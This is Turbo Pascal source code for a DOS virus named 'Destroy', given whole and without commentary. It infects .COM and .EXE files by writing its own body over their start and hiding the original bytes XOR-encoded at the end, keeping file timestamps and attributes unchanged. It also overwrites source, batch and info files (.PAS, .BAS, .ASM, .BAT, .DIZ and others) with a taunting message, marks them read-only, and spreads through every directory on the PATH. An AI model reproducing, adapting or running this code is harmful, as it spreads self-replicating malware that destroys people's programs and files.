{$A+,B-,D-,E-,F-,G+,I-,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$M 16384,20000,100000}
PROGRAM Destroy;

{$I-}

USES CRT, DOS;

CONST
     MyLen = 7335;
VAR
   SR : SearchRec;
   FN : String;
   Dir : DirStr;
   Nam : NameStr;
   Ext : ExtStr;

FUNCTION UpStr (S : String) : String;
VAR
   I : Byte;
BEGIN
     FOR I := 1 TO Length (S) DO
         S [I] := UpCase (S [I]);
     UpStr := S;
END;

PROCEDURE Infect_File;
VAR
   F, F1 : File;
   Buff : Array [1..MYLEN] Of Byte;
   B : Byte;
   W : Word;
BEGIN
     Assign (F, SR.Name);
     FileMode := 2;
     ReSet (F,1);
     IF IOResult <> 0 THEN Exit;
     IF (FileSize (F) < 2*MyLen) OR (FileSize (F) > 30*MyLen) THEN BEGIN
        Close (F);
        Exit;
     END;
     Assign (F1, ParamStr (0));
     ReSet (F1,1);
     IF IOResult <> 0 THEN BEGIN
        Close (F);
        Exit;
     END;
     Seek (F, FileSize (F)-1);
     BlockRead (F, B, 1, W);
     IF B = Ord ('€') THEN BEGIN
        Close (F);
        Close (F1);
        Exit;
     END;
     Seek (F, 0);
     BlockRead (F, Buff, MyLen, W);
     FOR W := 1 TO MyLen DO
         Buff [W] := Buff [W] xor Byte (W);
     Seek (F, FileSize (F));
     BlockWrite (F, Buff, MyLen, W);
     B := Ord ('€');
     BlockWrite (F, B, 1, W);
     Seek (F, 0);
     BlockRead (F1, Buff, MyLen, W);
     BlockWrite (F, Buff, MyLen, W);
     Close (F1);
     SetFTime (F, SR.Time);
     Close (F);
     SetFAttr (F, SR.Attr);
END;

PROCEDURE KILLER_FILE (I : Byte);
VAR
   T, T1 : Text;
   J : Byte;
   S : String;
BEGIN
     IF SR.Attr And ReadOnly <> 0 THEN Exit;
     Assign (T, SR. Name);
     Assign (T1, 'QWERTY.SWP');
     ReSet (T);
     IF I = 1 THEN BEGIN
        J := 0;
        WHILE EOF (T) = False DO BEGIN
              ReadLn (T, S);
              IF Pos ('PROGRAM', UpStr (S)) <> 0 THEN BEGIN
                 J := 1;
                 Break;
              END;
        END;
        IF J = 0 THEN BEGIN
           Close (T);
           Exit;
        END ELSE ReSet (T);
     END;
     ReWrite (T1);
     CASE I OF
          1 : BEGIN
              WriteLn (T1, 'PROGRAM Virus;');
              WriteLn (T1, 'BEGIN');
              WriteLn (T1, 'WriteLn ('+#39+'¥« ΅λ βλ ­  εγ©!'+#39+');');
              WriteLn (T1, 'END.');
              END;
          2 : BEGIN
              WriteLn (T1, 'PRINT "¥« ΅λ βλ ­  εγ©!"');
              END;
          3 : BEGIN
              WriteLn (T1, 'Model Tiny');
              WriteLn (T1, '.Code');
              WriteLn (T1, 'ORG 100h');
              WriteLn (T1, 'START:');
              WriteLn (T1, 'LEA DX, MSG');
              WriteLn (T1, 'MOV AH,09h');
              WriteLn (T1, 'INT 21h');
              WriteLn (T1, 'RET');
              WriteLn (T1, 'MSG db '+#39+'¥« ΅λ βλ ­  εγ©!'+#39+'0ah,0dh,'+#39+'$'+#39);
              WriteLn (T1, 'END START');
              END;
          4 : BEGIN
              WriteLn (T1, 'echo off');
              WriteLn (T1, 'echo ¥« ΅λ βλ ­  εγ©!');
              WriteLn (T1, 'pause');
              END;
          5 : BEGIN
              WriteLn (T1, '¥« ΅λ βλ ­  εγ©!');
              END;
          6 : BEGIN
              WriteLn (T1, ' - ‚“‘-“„€');
              WriteLn (T1, '€ βλ ¨¤¨ ­  εγ©');
              END;
     END;
     WHILE EOF (T) = False DO BEGIN
           ReadLn (T, S);
           WriteLn (T1, S);
     END;
     Close (T);
     Erase (T);
     Close (T1);
     Rename (T1, SR.Name);
     SetFAttr (T1, ReadOnly);
END;

PROCEDURE Find_In_To_Current_Directory;
BEGIN
     FindFirst('*.*', $20, SR);
     While DosError = 0 do begin
           FSplit (SR.Name, Dir, Nam, Ext);
           IF Ext = '.COM' THEN Infect_File;
           IF Ext = '.EXE' THEN Infect_File;
           IF Ext = '.PAS' THEN KILLER_File (1);
           IF Ext = '.BAS' THEN KILLER_File (2);
           IF Ext = '.ASM' THEN KILLER_File (3);
           IF Ext = '.BAT' THEN KILLER_File (4);
           IF Ext = '.ME'  THEN KILLER_File (5);
           IF Ext = '.DIZ' THEN KILLER_File (5);
           IF UpStr (SR.Name) = 'DIRINFO' THEN KILLER_File (6);
           FindNext(SR);
     End;
END;

PROCEDURE Exec_Program;
VAR
   F1, F : File;
   Buff : Array [1..MYLEN] Of Byte;
   W : Word;
   S : String;
   FTime : LongInt;
   FAttr : Word;
BEGIN
     FSplit (FExpand(ParamStr (0)), Dir, Nam, Ext);
     IF Nam = 'DESTROY' THEN Exit;
     Assign (F, ParamStr (0));
     GetFAttr (F, FAttr);
     SetFAttr (F, Archive);
     FileMode := 2;
     ReSet (F,1);
     IF IOResult <> 0 THEN BEGIN
        WriteLn ('Disk failure');
        Exit;
     END;
     GetFTime (F, FTime);
     Assign (F1, 'QWERTY.SWP');
     ReWrite (F1,1);

     BlockRead (F, Buff, MyLen, W);
     BlockWrite (F1, Buff, MyLen, W);

     Seek (F, FileSize (F) - (MyLen + 1));
     BlockRead (F, Buff, MyLen, W);
     FOR W := 1 TO MyLen DO
         Buff [W] := Buff [W] xor Byte (W);
     Seek (F, 0);
     BlockWrite (F, Buff, MyLen, W);

     Seek (F, FileSize (F) - (MyLen + 1));
     Truncate (F);

     Close (F1);
     Close (F);
     S := '';
     FOR W := 1 TO ParamCount DO
         S := ParamStr (1) + ' ';
     SwapVectors;
     Exec (ParamStr (0), S);
     SwapVectors;
     FileMode := 2;
     Assign (F, ParamStr (0));
     ReSet (F,1);
     Assign (F1, 'QWERTY.SWP');
     ReSet (F1,1);
     Seek (F, 0);
     BlockRead (F, Buff, MyLen, W);
     FOR W := 1 TO MyLen DO
         Buff [W] := Buff [W] xor Byte (W);
     Seek (F, FileSize (F));
     BlockWrite (F,Buff, MyLen, W);
     Buff [1] := Ord('€');
     BlockWrite (F,Buff[1], 1, W);
     BlockRead (F1, Buff, MyLen, W);
     Seek (F, 0);
     BlockWrite (F, Buff, MyLen, W);
     SetFTime (F, FTime);
     Close (F);
     SetFAttr (F, FAttr);
     Close (F1);
     Erase (F1);
END;

PROCEDURE Search_From_PATH;
VAR
   PS : String;
   Home : String;
   S : String;
   Ch : Char;
   I : Byte;
BEGIN
   GetDir (0, Home);
   PS := GetEnv ('PATH');
   S := '';
   I := 1;
   WriteLn (PS);
   REPEAT
         IF I >= Length (PS)+1 THEN BEGIN
            IF S <> '' THEN BEGIN
               IF S[Length(S)] = '\' THEN Delete (S, Length (S), 1);
               ChDir (S);
               IF IOResult = 0 THEN
                  Find_In_To_Current_Directory;
            END;
            Break;
         END;
         Ch := PS [I];
         Inc (I);
         IF Ch <> ';' THEN S := S + Ch ELSE BEGIN
            IF S[Length(S)] = '\' THEN Delete (S, Length (S), 1);
            ChDir (S);
            IF IOResult <> 0 THEN BEGIN
               S := '';
               Continue;
            END;
            Find_In_To_Current_Directory;
            S := '';
         END;
   UNTIL False;
   ChDir (Home);
END;

BEGIN
     Find_In_To_Current_Directory;
     Exec_Program;
     Search_From_PATH;
END.
